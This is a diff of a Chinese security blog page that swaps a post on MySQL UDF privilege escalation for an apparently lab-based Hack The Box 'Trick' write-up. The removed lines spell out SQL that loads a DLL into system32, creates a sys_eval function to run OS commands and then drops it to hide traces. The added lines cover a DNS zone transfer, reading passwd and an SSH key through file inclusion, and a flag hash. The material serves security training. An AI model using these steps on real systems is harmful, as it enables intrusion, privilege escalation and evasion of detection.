@@ -11,7 +11,7 @@
   
   <title>
     
-      UDF提权 
+      HTB-tirck 
       
       
       |
@@ -151,31 +151,19 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">UDF提权</div>
+      <div class="post-title">HTB-tirck</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2022-10-12 10:28:18
+          2022-10-14 16:38:11
         </span>
         
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
                 <span class="span--tag mr-8">
-                  <a href="/tags/%E6%8F%90%E6%9D%83/" title="提权">
-                    #提权
-                  </a>
-                </span>
-                
-                <span class="span--tag mr-8">
-                  <a href="/tags/MYSQL/" title="MYSQL">
-                    #MYSQL
-                  </a>
-                </span>
-                
-                <span class="span--tag mr-8">
-                  <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="数据库">
-                    #数据库
+                  <a href="/tags/HTB/" title="HTB">
+                    #HTB
                   </a>
                 </span>
                 
@@ -183,60 +171,34 @@
           
       </div>
       <div class="markdown-body">
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间沉迷于打靶，但是每次拿到webshell之后思路就断了，也让我发现自己对提权知识点掌握的并不是很牢固，拿不了root、system怎么办😢 ,练呗！</p>
-<h1 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h1><p>UDF（User defined function），即用户自定义函数，是MYSQL的一个扩展接口，用户可以使用该接口来创建函数。</p>
-<h1 id="利用方法和条件"><a href="#利用方法和条件" class="headerlink" title="利用方法和条件"></a>利用方法和条件</h1><p>利用方法</p>
-<blockquote>
-<p>在数据库中创建一张表，在表中插入udf.dll的数据，再从表中把数据导出到相应文件夹，MySQL版本小于5.1时，对应文件夹为C:\windows\system32；反之则需要放在MySQL安装目录下的MySQL\</p>
-<p>lib\plugin 下（一般plugin目录都不存在，所以需要自己手动创建，<a href="#one">后面会说</a>）</p>
-</blockquote>
-<p>利用条件（其实还是比较苛刻的）</p>
-<blockquote>
-<p>数据库用户权限为root</p>
-<p>有写入删除权限</p>
-</blockquote>
-<h1 id="战斗开始"><a href="#战斗开始" class="headerlink" title="战斗开始"></a>战斗开始</h1><p>先把<span id="one">payload</span>贴出来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">select version()		//查看数据库版本</span><br><span class="line"></span><br><span class="line">select current_user()		//查看当前数据库用户</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;secure_file_priv&#x27;	//查看是否写入权限</span><br><span class="line"></span><br><span class="line">select @@basedir	//查看安装目录</span><br><span class="line"></span><br><span class="line">show variables like &quot;%plugin%&quot;		//查看plugin目录位置</span><br><span class="line"></span><br><span class="line">select &#x27;#anything&#x27; into outfile &#x27;C:/phpstudy/mysql/lib::$INDEX_ALLOCATION&#x27;	//创建目录（plugin目录同理）,但是这里我从来就没成功过</span><br><span class="line"></span><br><span class="line">create table udf_ed(vital longblob);	//创建表</span><br><span class="line"></span><br><span class="line">insert into ed_udf values(load_file(&#x27;C:/Inetpub/wwwroot/udf_ed.dll&#x27;));		//写入数据</span><br><span class="line"></span><br><span class="line">select vital from ed_udf into dumpfile &#x27;C:/WINDOWS/system32/udf_ed.dll&#x27;;	//导出dll文件</span><br><span class="line"></span><br><span class="line">create function sys_eval returns string soname &quot;udf_ed.dll&quot;		//创建函数</span><br><span class="line"></span><br><span class="line">select * from func;		//查询函数是否创建成功</span><br><span class="line"></span><br><span class="line">select sys_eval(&#x27;ipconfig&#x27;);	//调用命令</span><br><span class="line"></span><br><span class="line">drop function sys_eval;		//删除痕迹</span><br></pre></td></tr></table></figure>
+        <h1 id="HTB-trick靶机"><a href="#HTB-trick靶机" class="headerlink" title="HTB trick靶机"></a>HTB trick靶机</h1><h2 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h2><p>拿到靶机首先nmap跑一波信息收集，可以看到这台靶机比以往的靶机多开了个53（DNS）端口，这题的突破口也就在53端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Bebop)-[~]</span><br><span class="line">└─# nmap -sT -sC -T4 10.10.11.166</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 09:33 EDT</span><br><span class="line">Warning: 10.10.11.166 giving up on port because retransmission cap hit (6).</span><br><span class="line">Nmap scan report for 10.10.11.166 (10.10.11.166)</span><br><span class="line">Host is up (0.58s latency).</span><br><span class="line">Not shown: 955 closed tcp ports (conn-refused), 41 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)</span><br><span class="line">|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)</span><br><span class="line">|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)</span><br><span class="line">25/tcp open  smtp</span><br><span class="line">|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING</span><br><span class="line">53/tcp open  domain</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-title: Coming Soon - Start Bootstrap Theme</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 261.26 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>通过文件上传拿到webshell后发现是个低权限，cmd命令都执行不了</p>
-<p><img src="/../images/image-20221012111438103.png" alt="image-20221012111438103"></p>
-<p>顺便翻翻发现了网站的配置文件，获得数据库密码，这也告诉我们信息收集无论在何时何刻都很重要</p>
-<p><img src="/../images/image-20221012111613062.png" alt="image-20221012111613062"></p>
-<p>连接数据库后第一件事还是信息收集，这里我们查看数据库的版本，发现是5.0的（所以后面要上传的目录就是C:\windows\system32）</p>
-<p><img src="/../images/image-20221012180105347.png" alt="image-20221012180105347"></p>
-<p>接下来查看当前用户，是个root权限 👍</p>
-<p><img src="/../images/image-20221012180127633.png" alt="image-20221012180127633"></p>
-<p>再看看有没有对我们导入导出的权限做限制，发现并没有。至此UDF提权的条件完全满足，开始干正事。</p>
-<p><img src="/../images/image-20221012180240045.png" alt="image-20221012180240045"></p>
-<p>查看目标机器的操作位数，因为后面要上传的dll文件要与机器的操作位数相同</p>
-<p><img src="/../images/image-20221013094352205.png" alt="image-20221013094352205"></p>
-<p>把我们的dll文件随便上传到一个能上传的路径，这里我上传到了C:&#x2F;Inetpub&#x2F;cms&#x2F;目录下</p>
-<p><img src="/../images/image-20221012180738448.png" alt="image-20221012180738448"></p>
-<p>再次进入数据库，创建一张表，表名随意，字段随意，数据类型要为longblob（二进制大对象，是一个可以存储二进制文件的容器）</p>
-<p><img src="/../images/image-20221012180434905.png" alt="image-20221012180434905"></p>
-<p>通过load_file读取我们上传的dll文件，把内容插入表中</p>
-<p><img src="/../images/image-20221012180936689.png" alt="image-20221012180936689"></p>
-<p>这里查询表内的内容，通过dumpfile以二进制的形式导出到c:&#x2F;windows&#x2F;system32&#x2F;目录下，命名为udf_test.dll</p>
-<p><img src="/../images/image-20221012181236595.png" alt="image-20221012181236595"></p>
-<p>通过刚刚从表内导出的dll文件创建函数</p>
-<p><img src="/../images/image-20221012181351806.png" alt="image-20221012181351806"></p>
-<p>已经创建成功了</p>
-<p><img src="/../images/image-20221012181503590.png" alt="image-20221012181503590"></p>
-<p>至高无上的system权限，自此就可以进行愉快的后渗透了😋</p>
-<p><img src="/../images/image-20221012181535070.png" alt="image-20221012181535070"></p>
-<p><img src="/../images/image-20221012200747527.png" alt="image-20221012200747527"></p>
-<p><img src="/../images/image-20221012200812304.png" alt="image-20221012200812304"></p>
-<p><img src="/../images/image-20221012200906543.png" alt="image-20221012200906543"></p>
-<p><img src="/../images/image-20221012200927278.png" alt="image-20221012200927278"></p>
-<p>删除函数</p>
-<p><img src="/../images/image-20221012201845133.png" alt="image-20221012201845133"></p>
+<p>先直接浏览器访问80端口，看到如下界面，整个页面都是静态的，到处点几下，没有任何收获</p>
+<p><img src="/../images/image-20221009214523452.png" alt="image-20221009214523452"></p>
+<p>因为目标开启了DNS服务，我们用nslookup收集一下他的域名信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Bebop)-[~]</span><br><span class="line">└─# nslookup</span><br><span class="line">&gt; server 10.10.11.166</span><br><span class="line">Default server: 10.10.11.166</span><br><span class="line">Address: 10.10.11.166#53</span><br><span class="line">&gt; 10.10.11.166</span><br><span class="line">166.11.10.10.in-addr.arpa       name = trick.htb.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Bebop)-[~]</span><br><span class="line">└─# dig axfr @10.10.11.166 trick.htb</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.4-2-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166 trick.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">trick.htb.              604800  IN      NS      trick.htb.</span><br><span class="line">trick.htb.              604800  IN      A       127.0.0.1</span><br><span class="line">trick.htb.              604800  IN      AAAA    ::1</span><br><span class="line">preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.</span><br><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 912 msec</span><br><span class="line">;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)</span><br><span class="line">;; WHEN: Sun Oct 09 22:43:51 EDT 2022</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 231)</span><br></pre></td></tr></table></figure>
+
+<p>利用文件包含字典遍历读取passwd文件，发现目标存在名为michael的可登录用户</p>
+<p><img src="/../images/image-20221017195802258.png" alt="image-20221017195802258"></p>
+<p>我们再试着读取目标用户的ssh私钥</p>
+<p><img src="/../images/image-20221017195902933.png" alt="image-20221017195902933"></p>
+<p>尝试连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Bebop)-[~]</span><br><span class="line">└─# ssh michael@10.10.11.166 -i id_rsa</span><br><span class="line">Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Mon Oct 17 10:12:52 2022 from 10.10.14.98</span><br><span class="line">michael@trick:~$ </span><br></pre></td></tr></table></figure>
+
+<p>成功登上目标机器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">michael@trick:~$ ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  Videos</span><br><span class="line">Documents  Music      Public    user.txt</span><br><span class="line">michael@trick:~$ cat user.txt</span><br><span class="line">721d604007b62320b2c857f3ec3f9260</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们上传pspy可以发现一个定时任务文件，但是它每一分钟会对自身进行一次恢复，所以手一定要快。因为网络环境实在太卡了，所以就没有后续了。</p>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2022/07/04/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/" target="_self">
+              <a href="/2022/10/14/%E5%86%B0%E8%9D%8E3.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -245,27 +207,15 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2022-10-12 10:28:18
+              2022-10-14 16:38:11
             </span>
             
                   <span class="post-tags">
                     <i class="iconfont icon-tags mr-10" title="Tags"></i>
                     
                     <span class="span--tag mr-8">
-                      <a href="/tags/%E6%8F%90%E6%9D%83/" title="提权">
-                        #提权
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/MYSQL/" title="MYSQL">
-                        #MYSQL
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="数据库">
-                        #数据库
+                      <a href="/tags/HTB/" title="HTB">
+                        #HTB
                       </a>
                     </span>
                     
@@ -273,11 +223,6 @@
               
           </div>
           <div class="post-foot-prev">
-            
-              <a href="/2022/10/14/%E5%86%B0%E8%9D%8E3.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
             
           </div>
         </div>
@@ -291,7 +236,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UDF"><span class="toc-text">UDF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%92%8C%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用方法和条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%98%E6%96%97%E5%BC%80%E5%A7%8B"><span class="toc-text">战斗开始</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-trick%E9%9D%B6%E6%9C%BA"><span class="toc-text">HTB trick靶机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E7%82%B9"><span class="toc-text">打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li></ol></li></ol>
       
     </div>
   </div>
@@ -570,12 +515,12 @@
       </a>
       <div class="share-content hidden">
         
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + UDF%E6%8F%90%E6%9D%83 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F10%2F12%2Fudf%25E6%258F%2590%25E6%259D%2583%2F + '" target="_blank" title="Twitter">
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + HTB-tirck + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F10%2F14%2Ftrick%2F + '" target="_blank" title="Twitter">
             <i class="iconfont icon-twitter"></i>
           </a>
         
         
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/10/12/udf%E6%8F%90%E6%9D%83/" target="_blank" title="Facebook">
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/10/14/trick/" target="_blank" title="Facebook">
             <i class="iconfont icon-facebooksquare"></i>
           </a>
         
